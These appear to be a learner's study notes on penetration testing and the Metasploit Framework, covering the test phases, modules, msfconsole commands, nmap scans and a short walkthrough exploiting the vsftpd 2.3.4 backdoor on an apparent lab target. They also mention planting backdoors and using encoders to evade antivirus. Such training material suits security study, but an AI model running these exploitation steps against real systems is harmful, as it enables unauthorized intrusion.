## Basic of Penetration testing

- Lets list some of the fundamental steps in penetration testing"
  - Information Gathering / Reconnaissance
  - Vulnerability Analysis
  - Exploitation
  - Post Exploitation
  - Report

1. Information Gathering / Reconnaissance

- At the very beginning of any penetration testing, information gathering is done. The more information you can gather about the target, the better it will for you kow the target system and use the information later in the process
- Information may includes crucial information like the open ports, running services, or general information such as the domain name registration information. Various techniques and tools are used for gathering information about the target such as **nmap, zenmap, whois, nslookup, dig, maltego, etc.**
- One of the most used tools for information gathering and scanning is the nmap or network mapper utility

2. Vulnerability Analysis

- In this step, the potential vulnerabilities of the target are analyzed for further actions. Not all the vulnerabilities are of the same level.
- Some vulnerabilities may give you entire access o the system once exploited while some may only give you some normal information about the system.
- The vulnerabilities that might lead to some major results are the once to go forward with from here. This is the step where Metasploit 3. ExploitationGives you a useful database to work with

3. Exploitation

- After the identified vulnerabilities have been analyzed, this is the step to take advantage of the vulnerabilities.
- In this step, specific programs/exploits are used to attack the machine with the vulnerabilities.
- Exploits come from many sources. one of the primary source is the vulnerability and exploit vulnerabilities and exploit researchers.
- Those who are already using the outdated version might not get the update and remains vulnerable to the exploits.
- The Metasploit Framework is the most suitable tool for this step. It givers you the option to choose from thousands of exploits and use them directly from the metasploit and use them directly fom the Metasploit console, Now exploits are updated and incorporated in Metasploit regularly

4. Post Exploitation

- This is the step after you've already completed exploitiong the target system. you've git access to the system to o with the system . you may have git access to a low privilege user
- You will try to escalate your privilege in this step. You may also keep a backdoor the victum machine to allow yourself to enter the system later whenever you want.
- Metasploit has numerous functionalities to help you inthis step as well

5. Report

- This is the step that many penetration testers will have to complete.
- After carrying out their testing, the company or the organization will require them to write a detailed report about the testing and improvement to be done

---

# Basics of Metasploit Framework

## Modules of Metasploit Framework

- This core functionalities that Metasploit provides can be summarized by some of the modules:
  - Exploits
  - payloads
  - Auxiliaries
  - Encoders

1. _Exploits_
   - Exploit is the program that is used to attack the vulnerabilities of the target. There is a large database for exploits on Metasploit Framework. You can search the database for the exploits and see the information about how they work, the time they were discovered, how effective they are. and so on.

2. _Payloads_
   - Payloads perform some tasks after the exploits runs. There are different types of payloads that you can use. For example, you could use the reverse shell payload, which basically generates a shell/terminal/cmd n the victim machine and connects back the attacking machine.
   - Metasploit Framework has a lot of options for payloads. Some of the most used once are the reverse shell, bind shell, meterpreter, etc.

3. _Auxiliaries_
   - These are the programs that do not directly exploit a system. Rather they are built for providing custom functionalities in Metasploit. Some auxiliaries are sniffers, port scanners, etc. These may helps you scan the victim machine for information gathering purposes.
   - For example, if you see a victim machine is running ssh service, but you could not find out what version of ssh it is using- you could scan the port and get the version of ssh using auxiliary modules

4. _Encoders_
   - Metasploit also provides you with the option to use encoders that will encrypt the codes in such a way that it becomes obscure for the threat detection programs to interpret. They will self decrypt and become original codes when executed
   - However, the encoders are limited and the anti-virus has many signatures of them already in their databases. So simply using an encoder will not guarantee anti-virus evasion

---

- **Components of Metasploit Framework**
  - msfconsole
  - msfdb
  - msfvenom
  - meterpreter

1. _msfconsole_
   - This is the CLI interface that is used by the metasploit Framework. It enables you to navigate through all the metasploit databases at ease and use the required modules. this is the command that you entered before to get the Metasploit console

2. _msfdb_
   - Managing all the data can become a hurdle real quick, which is why Metasploit Framework gives you the option to use PostgreSQL database to store and access your data quickly and efficiently
   - For example, you may store and organize your scan results in the database to access them later

3. _msfvenom_
   - This is the tool that mimics its name and helps you create your own payloads (venoms to inject in your victim machine)
   - This is important since your payload might get detected as a threat and get deleted by threat detection software such as anti-viruses or anti-malware.

4. _meterpreter_
   - meterpreter is an advanced payload that has a lot of functionalities built into it. it communicates using encrypted packets
   - Furthermore, meterpreter is quite difficult to trace and locate once in the system. it can capture screenshots, dump password hashes, and many more

---

## Basic commands of Metasploit Framework

- _msfconsole_ : Fire up the metasploit console by typing in
- _ls_
- _show -h_ : how command will show you specific modules or all the modules
- _search any_name_ : search unix
- _use ($ use 0)_: you can select the module by the use command followed by the name or the id of the module
- _info_ : you could get the description by looking at the original code of the module

- _options/show options_ : Will show the details about this info
- _set_ : set a value to a variable
- _show payloads_ : you will get the only payloads that are compatible with the exploit
- _check_ : Check if the exploit will work or not

---

# Day 2

---

## Target Identification and Host discovery

Now we'll be performing the first step in any penetration testing - gathering information about the target host

- You might want to find out IP address if the target host in your case
- You can use DNS enumeration for that case. DNS enumeration is the way to fins out the DNS records for a host.
- You can use nslookup, dig, or host command to perform DNS enumeration and get the IP address associated with a domain
- nmap -sN <ip> (Host UP/DOWN)
- nmap -sV <ip> (Port Scanning & Service Detection)

```bash
$ nmap -sn <ip>
$ nmap -sv <ip>
$ nmap -v -A <ip>
```

Report of Nmap

| Port    | State | Services | Version                                      |
| ------- | ----- | -------- | -------------------------------------------- |
| 21/tcp  | open  | ftp      | vsftpd 2.3.4                                 |
| 22/tcp  | open  | ssh      | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) |
| 23/tcp  | open  | telnet   | Linux telnetd                                |
| 25/tcp  | open  | smtp     | Postfix smtpd                                |
| 53/tcp  | open  | domain   | ISC BIND 9.4.2                               |
| 80/tcp  | open  | http     | Apache httpd 2.2.8 ((Ubuntu) DAV/2)          |
| 111/tcp | open  | rpcbind  | 2 (RPC #100000)                              |

.... And So On

---

## Vulnerability Analysis

- Now that we've performed the service detection step, we know what versions of applications our victim is running. We just have to find out which one of them might be vulnerable. You can find out vulnerabilities just be googling about them, or you can also search them in your Metasploit database.

- #search vsftpd
- #search OpenSSH
- #search Postfix

---

## Exposing Vulnerabilities

This is the most anticipated step of the penetration test. In this step, we'll exploit the victim machine in all it's glory. Let's begin with the most straightforward vulnerability to exploit that we found in the prev.. step. It is the vsftpd backdoor command execution exploit.

- use 0
- set RHOSTS <ip>
- show payloads
- expoit
- whoami
- sessions
- sessions -l
- sessions -u 1
- sessions -k 1
